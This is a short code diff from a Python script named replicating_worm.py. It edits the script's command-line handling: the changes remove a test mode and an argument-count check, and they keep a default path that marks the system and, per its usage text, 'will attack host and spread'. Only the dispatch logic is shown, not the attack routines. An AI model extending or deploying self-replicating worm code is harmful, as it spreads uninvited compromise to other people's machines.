@@ -147,16 +147,10 @@ def startAttacking(wormLocation, isHost):
 	
 def main(argv):
 
-	if len(argv) == 2:
-		if argv[1] == "-h":
-			print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\n-t Will see if the functions work!\nDefault will attack host and spread\n")
-		elif argv[1] == "-host":
-			startAttacking("replicating_worm.py", True)
-		elif argv[1] == "-t":
-			print("Testing if everything works right")
-			print(isTargetInfected())
-		else:
-			print("Don't understand argument!!\nTry again please")
+	if argv[1] == "-h":
+		print("Usage: python replicating_worm.py [-host | -h | -t]\n-host this si the host system don't attack!\n-h Shows help screen\nDefault will attack host and spread\n")
+	elif argv[1] == "-host":
+		startAttacking("replicating_worm.py", True)
 	else:
 		if isTargetInfected() == False:
 			markSystem()
